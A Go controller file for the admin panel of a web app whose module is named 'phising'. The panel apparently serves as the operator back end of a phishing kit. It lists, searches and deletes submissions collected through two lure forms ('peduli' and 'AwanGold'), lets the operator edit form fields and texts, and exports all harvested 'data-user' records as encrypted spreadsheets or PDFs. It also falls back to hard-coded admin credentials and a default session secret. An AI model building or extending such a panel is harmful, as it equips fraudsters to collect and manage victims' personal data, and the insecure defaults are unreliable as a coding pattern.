package controllers

import (
	"context"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/sessions"
	"phising/models"
)

const adminSessionName = "admin_session"

var (
	adminStore     *sessions.CookieStore
	adminLogin     *template.Template
	adminDashboard *template.Template
	adminFormTmpl  *template.Template
	adminSettings  *template.Template
)

func init() {
	secret := os.Getenv("ADMIN_SESSION_SECRET")
	if secret == "" {
		secret = "change-me-in-production-32bytes!!"
	}
	adminStore = sessions.NewCookieStore([]byte(secret))
	adminStore.Options.HttpOnly = true
	adminStore.Options.SameSite = http.SameSiteLaxMode
	adminStore.Options.Path = "/"
	adminStore.Options.MaxAge = 24 * 3600 // 24 jam

	adminLogin = template.Must(template.ParseFiles(filepath.Join("views", "admin", "login.html")))
	adminDashboard = template.Must(template.New("dashboard.html").Funcs(template.FuncMap{
		"add": func(a, b int) int { return a + b },
		"toJSON": func(v any) template.JS {
			b, err := json.Marshal(v)
			if err != nil {
				return template.JS("[]")
			}
			return template.JS(b)
		},
		"formatTime": func(t time.Time) string {
			if t.IsZero() {
				return "-"
			}
			return t.Format("02 Jan 2006 15:04")
		},
	}).ParseFiles(
		filepath.Join("views", "admin", "dashboard.html"),
		filepath.Join("views", "admin", "nav.html"),
	))
	adminFormTmpl = template.Must(template.New("form.html").Funcs(template.FuncMap{
		"add": func(a, b int) int { return a + b },
	}).ParseFiles(
		filepath.Join("views", "admin", "form.html"),
		filepath.Join("views", "admin", "nav.html"),
	))
	adminSettings = template.Must(template.ParseFiles(
		filepath.Join("views", "admin", "settings.html"),
		filepath.Join("views", "admin", "nav.html"),
	))
}

func getAdminCreds() (user, pass string) {
	user = os.Getenv("ADMIN_USERNAME")
	pass = os.Getenv("ADMIN_PASSWORD")
	if user == "" {
		user = "admin"
	}
	if pass == "" {
		pass = "admin123"
	}
	return user, pass
}

func adminAuthenticated(r *http.Request) bool {
	sess, err := adminStore.Get(r, adminSessionName)
	if err != nil {
		return false
	}
	_, ok := sess.Values["admin"].(bool)
	return ok
}

func RequireAdmin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !adminAuthenticated(r) {
			http.Redirect(w, r, "/admin/login", http.StatusFound)
			return
		}
		next.ServeHTTP(w, r)
	}
}

func AdminLoginHandler(w http.ResponseWriter, r *http.Request) {
	if adminAuthenticated(r) {
		http.Redirect(w, r, "/admin", http.StatusFound)
		return
	}

	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		data := map[string]any{"Error": ""}
		if err := adminLogin.Execute(w, data); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
	case http.MethodPost:
		if err := r.ParseForm(); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		username := r.FormValue("username")
		password := r.FormValue("password")
		adminUser, adminPass := getAdminCreds()

		if username != adminUser || password != adminPass {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			_ = adminLogin.Execute(w, map[string]any{"Error": "Username atau password salah."})
			return
		}

		sess, _ := adminStore.Get(r, adminSessionName)
		sess.Values["admin"] = true
		if err := sess.Save(r, w); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		http.Redirect(w, r, "/admin", http.StatusFound)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func AdminLogoutHandler(w http.ResponseWriter, r *http.Request) {
	sess, _ := adminStore.Get(r, adminSessionName)
	sess.Values["admin"] = nil
	sess.Options.MaxAge = -1
	_ = sess.Save(r, w)
	http.Redirect(w, r, "/admin/login", http.StatusFound)
}

func AdminDashboardHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/admin" && r.URL.Path != "/admin/" {
		http.NotFound(w, r)
		return
	}

	source := strings.TrimSpace(strings.ToLower(r.URL.Query().Get("source")))
	if source != "gold" {
		source = "peduli"
	}

	var (
		fields      []models.FormField
		total       int
		submissions []models.Submission
		err         error
	)

	if source == "gold" {
		fields, err = models.ListForm2Fields(r.Context())
		if err != nil {
			fields = []models.FormField{}
		}
		total, err = models.CountForm2Submissions(r.Context())
		if err != nil {
			log.Printf("CountForm2Submissions: %v", err)
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	} else {
		fields, err = models.ListFormFields(r.Context())
		if err != nil {
			fields = []models.FormField{}
		}
		total, err = models.CountSubmissions(r.Context())
		if err != nil {
			log.Printf("CountSubmissions: %v", err)
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	}

	pageSize := 50
	page := 1
	if p, err := strconv.Atoi(r.URL.Query().Get("page")); err == nil && p > 0 {
		page = p
	}
	q := strings.TrimSpace(r.URL.Query().Get("q"))
	fieldKey := strings.TrimSpace(r.URL.Query().Get("field"))

	maxPage := (total + pageSize - 1) / pageSize
	if maxPage < 1 {
		maxPage = 1
	}
	if page > maxPage {
		page = maxPage
	}
	offset := (page - 1) * pageSize

	if source == "gold" {
		submissions, err = models.ListForm2SubmissionsPage(r.Context(), pageSize, offset)
		if err != nil {
			log.Printf("ListForm2SubmissionsPage: %v", err)
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	} else {
		submissions, err = models.ListSubmissionsPage(r.Context(), pageSize, offset)
		if err != nil {
			log.Printf("ListSubmissionsPage: %v", err)
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	}

	// Filter sederhana di-memory (berlaku pada halaman saat ini).
	if q != "" {
		qq := strings.ToLower(q)
		var filtered []models.Submission
		for _, s := range submissions {
			if fieldKey != "" {
				if strings.Contains(strings.ToLower(s.Data[fieldKey]), qq) {
					filtered = append(filtered, s)
				}
				continue
			}
			ok := false
			for _, v := range s.Data {
				if strings.Contains(strings.ToLower(v), qq) {
					ok = true
					break
				}
			}
			if ok {
				filtered = append(filtered, s)
			}
		}
		submissions = filtered
	}

	since24 := time.Now().Add(-24 * time.Hour)
	last24Peduli, _ := models.CountSubmissionsSince(r.Context(), since24)
	last24Gold, _ := models.CountForm2SubmissionsSince(r.Context(), since24)
	totalPeduli, _ := models.CountSubmissions(r.Context())
	totalGold, _ := models.CountForm2Submissions(r.Context())
	trendLabels, trendPeduli, trendGold := build7DayTrend(r.Context())

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	if err := adminDashboard.Execute(w, map[string]any{
		"Fields":         fields,
		"Submissions":    submissions,
		"Page":           page,
		"MaxPage":        maxPage,
		"PageSize":       pageSize,
		"Total":          total,
		"Q":              q,
		"FieldKey":       fieldKey,
		"NavActive":      "data",
		"Source":         source,
		"TotalPeduli":    totalPeduli,
		"TotalAwanGold":  totalGold,
		"Last24Peduli":   last24Peduli,
		"Last24AwanGold": last24Gold,
		"TrendLabels":    trendLabels,
		"TrendPeduli":    trendPeduli,
		"TrendGold":      trendGold,
	}); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func AdminDeleteSubmissionHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	idStr := r.URL.Query().Get("id")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil || id <= 0 {
		http.Redirect(w, r, "/admin", http.StatusFound)
		return
	}
	source := strings.TrimSpace(strings.ToLower(r.URL.Query().Get("source")))
	var delErr error
	if source == "gold" {
		delErr = models.DeleteForm2Submission(r.Context(), id)
	} else {
		delErr = models.DeleteSubmission(r.Context(), id)
	}
	if delErr != nil {
		log.Printf("DeleteSubmission (%s): %v", source, delErr)
		http.Error(w, delErr.Error(), http.StatusInternalServerError)
		return
	}
	redirectTo := "/admin"
	if source == "gold" {
		redirectTo = "/admin?source=gold"
	}
	http.Redirect(w, r, redirectTo, http.StatusFound)
}

func AdminBulkDeleteSubmissionsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	source := strings.TrimSpace(strings.ToLower(r.FormValue("source")))
	ids := r.Form["ids"]
	for _, idStr := range ids {
		id, err := strconv.ParseInt(idStr, 10, 64)
		if err != nil || id <= 0 {
			continue
		}
		if source == "gold" {
			_ = models.DeleteForm2Submission(r.Context(), id)
			continue
		}
		_ = models.DeleteSubmission(r.Context(), id)
	}
	redirectTo := "/admin"
	if source == "gold" {
		redirectTo = "/admin?source=gold"
	}
	http.Redirect(w, r, redirectTo, http.StatusFound)
}

func build7DayTrend(ctx context.Context) ([]string, []int, []int) {
	labels := make([]string, 0, 7)
	peduli := make([]int, 0, 7)
	gold := make([]int, 0, 7)

	peduliRows, _ := models.ListSubmissions(ctx)
	goldRows, _ := models.ListForm2Submissions(ctx)
	peduliMap := map[string]int{}
	goldMap := map[string]int{}
	for _, s := range peduliRows {
		if s.CreatedAt.IsZero() {
			continue
		}
		key := s.CreatedAt.Format("2006-01-02")
		peduliMap[key]++
	}
	for _, s := range goldRows {
		if s.CreatedAt.IsZero() {
			continue
		}
		key := s.CreatedAt.Format("2006-01-02")
		goldMap[key]++
	}

	now := time.Now()
	for i := 6; i >= 0; i-- {
		d := now.AddDate(0, 0, -i)
		key := d.Format("2006-01-02")
		labels = append(labels, d.Format("02 Jan"))
		peduli = append(peduli, peduliMap[key])
		gold = append(gold, goldMap[key])
	}
	return labels, peduli, gold
}

func AdminSettingsHandler(w http.ResponseWriter, r *http.Request) {
	settings, _ := models.GetFormSettings(r.Context())
	if settings == nil {
		settings = make(map[string]string)
	}

	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_ = adminSettings.Execute(w, map[string]any{
			"Settings":  settings,
			"Saved":     r.URL.Query().Get("saved") == "1",
			"NavActive": "settings",
		})
	case http.MethodPost:
		if err := r.ParseForm(); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		updates := map[string]string{
			"form_title":           r.FormValue("form_title"),
			"form_subtitle":        r.FormValue("form_subtitle"),
			"form_success_message": r.FormValue("form_success_message"),
			"form_help_text":       r.FormValue("form_help_text"),
		}
		for k, v := range updates {
			if err := models.SetFormSetting(r.Context(), k, v); err != nil {
				log.Printf("SetFormSetting %s: %v", k, err)
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
		}
		http.Redirect(w, r, "/admin/settings?saved=1", http.StatusFound)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func AdminFormHandler(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path
	switch {
	case path == "/admin/form" || path == "/admin/form/":
		adminFormList(w, r)
	case path == "/admin/form/add":
		adminFormAdd(w, r)
	case path == "/admin/form/edit":
		adminFormEdit(w, r)
	case path == "/admin/form/delete":
		adminFormDelete(w, r)
	default:
		http.NotFound(w, r)
	}
}

func adminFormList(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	fields, _ := models.ListFormFields(r.Context())
	if fields == nil {
		fields = []models.FormField{}
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = adminFormTmpl.Execute(w, map[string]any{
		"Fields":          fields,
		"EditField":       nil,
		"Mode":            "list",
		"FormAdminPath":   "/admin/form",
		"FormPagePath":    "/form",
		"NavActive":       "form",
	})
}

func adminFormAdd(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_ = adminFormTmpl.Execute(w, map[string]any{
			"Fields":        nil,
			"EditField":     nil,
			"Mode":          "add",
			"FormAdminPath": "/admin/form",
			"FormPagePath":  "/form",
			"NavActive":     "form",
		})
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	fields, _ := models.ListFormFields(r.Context())
	f := models.FormField{
		Label:     r.FormValue("label"),
		Name:      r.FormValue("name"),
		FieldType: r.FormValue("field_type"),
		Required:  r.FormValue("required") == "1",
		Options:   r.FormValue("options"),
		SortOrder: len(fields),
	}
	if f.Label == "" || f.Name == "" || f.FieldType == "" {
		http.Redirect(w, r, "/admin/form/add", http.StatusFound)
		return
	}
	if err := models.CreateFormField(r.Context(), &f); err != nil {
		log.Printf("CreateFormField: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	http.Redirect(w, r, "/admin/form", http.StatusFound)
}

func adminFormEdit(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Query().Get("id")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil || id <= 0 {
		http.Redirect(w, r, "/admin/form", http.StatusFound)
		return
	}
	if r.Method == http.MethodGet {
		f, err := models.GetFormFieldByID(r.Context(), id)
		if err != nil {
			http.Redirect(w, r, "/admin/form", http.StatusFound)
			return
		}
		fields, _ := models.ListFormFields(r.Context())
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_ = adminFormTmpl.Execute(w, map[string]any{
			"Fields":          fields,
			"EditField":       f,
			"Mode":            "edit",
			"FormAdminPath":   "/admin/form",
			"FormPagePath":    "/form",
			"NavActive":       "form",
		})
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	existing, err := models.GetFormFieldByID(r.Context(), id)
	if err != nil {
		http.Redirect(w, r, "/admin/form", http.StatusFound)
		return
	}
	f := models.FormField{
		ID:        id,
		Label:     r.FormValue("label"),
		Name:      r.FormValue("name"),
		FieldType: r.FormValue("field_type"),
		Required:  r.FormValue("required") == "1",
		Options:   r.FormValue("options"),
		SortOrder: existing.SortOrder,
	}
	if err := models.UpdateFormField(r.Context(), &f); err != nil {
		log.Printf("UpdateFormField: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	http.Redirect(w, r, "/admin/form", http.StatusFound)
}

func adminFormDelete(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	idStr := r.URL.Query().Get("id")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil || id <= 0 {
		http.Redirect(w, r, "/admin/form", http.StatusFound)
		return
	}
	if err := models.DeleteFormField(r.Context(), id); err != nil {
		log.Printf("DeleteFormField: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	http.Redirect(w, r, "/admin/form", http.StatusFound)
}

func AdminExportHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	format := r.URL.Query().Get("format")
	source := strings.TrimSpace(strings.ToLower(r.URL.Query().Get("source")))
	raw, ctype, plainName, err := buildExportPayload(r.Context(), format, source)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	sess, _ := adminStore.Get(r, adminSessionName)
	key, _ := sess.Values["export_key"].(string)
	if strings.TrimSpace(key) == "" {
		http.Error(w, "Generate key ZIP dulu sebelum download export.", http.StatusBadRequest)
		return
	}
	encBody, err := encryptWithPython(raw, key)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	_ = ctype // encrypted payload dikirim sebagai octet-stream
	writeAttachment(w, "application/octet-stream", plainName+".enc", encBody)
}

func AdminExportKeyHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	zipBody, key, err := buildKeyBundleZip()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	// Persist key in admin session so next export is auto-encrypted in background.
	sess, _ := adminStore.Get(r, adminSessionName)
	sess.Values["export_key"] = key
	_ = sess.Save(r, w)

	name := fmt.Sprintf("export-key-%s.zip", time.Now().Format("20060102-150405"))
	writeAttachment(w, "application/zip", name, zipBody)
}

func AdminExportDecryptHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := r.ParseMultipartForm(10 << 20); err != nil {
		http.Error(w, "gagal parse form upload", http.StatusBadRequest)
		return
	}
	keyFile, _, err := r.FormFile("key_file")
	if err != nil {
		http.Error(w, "file key zip wajib diupload", http.StatusBadRequest)
		return
	}
	defer keyFile.Close()
	keyZip, err := io.ReadAll(keyFile)
	if err != nil {
		http.Error(w, "gagal membaca key file", http.StatusBadRequest)
		return
	}
	passphrase, err := readKeyFromZip(keyZip)
	if err != nil {
		http.Error(w, "key file tidak valid: "+err.Error(), http.StatusBadRequest)
		return
	}

	encFile, encHeader, err := r.FormFile("encrypted_file")
	if err != nil {
		http.Error(w, "file encrypted wajib diupload", http.StatusBadRequest)
		return
	}
	defer encFile.Close()
	encBlob, err := io.ReadAll(encFile)
	if err != nil {
		http.Error(w, "gagal membaca file encrypted", http.StatusBadRequest)
		return
	}

	raw, err := decryptWithPython(encBlob, passphrase)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	outName := strings.TrimSpace(encHeader.Filename)
	outName = strings.TrimSuffix(outName, ".enc")
	if outName == "" || outName == encHeader.Filename {
		outName = "decrypted-data.bin"
	}
	ctype := "application/octet-stream"
	if strings.HasSuffix(strings.ToLower(outName), ".pdf") {
		ctype = "application/pdf"
	}
	if strings.HasSuffix(strings.ToLower(outName), ".xlsx") {
		ctype = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
	}
	writeAttachment(w, ctype, outName, raw)
}

func buildExportPayload(ctx context.Context, format, source string) ([]byte, string, string, error) {
	var (
		fields      []models.FormField
		submissions []models.Submission
		err         error
	)
	if source == "gold" {
		fields, _ = models.ListForm2Fields(ctx)
		submissions, err = models.ListForm2Submissions(ctx)
		if err != nil {
			log.Printf("ListForm2Submissions: %v", err)
			return nil, "", "", err
		}
	} else {
		fields, _ = models.ListFormFields(ctx)
		submissions, err = models.ListSubmissions(ctx)
		if err != nil {
			log.Printf("ListSubmissions: %v", err)
			return nil, "", "", err
		}
	}
	ts := time.Now().Format("20060102-150405")
	prefix := "data-user"
	if source == "gold" {
		prefix = "data-user-awangold"
	}
	switch format {
	case "xlsx", "excel":
		raw, err := buildExcelDynamic(fields, submissions)
		return raw, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", fmt.Sprintf("%s-%s.xlsx", prefix, ts), err
	case "pdf":
		raw, err := buildPDFDynamic(fields, submissions)
		return raw, "application/pdf", fmt.Sprintf("%s-%s.pdf", prefix, ts), err
	default:
		return nil, "", "", fmt.Errorf("format tidak valid (gunakan format=xlsx atau format=pdf)")
	}
}
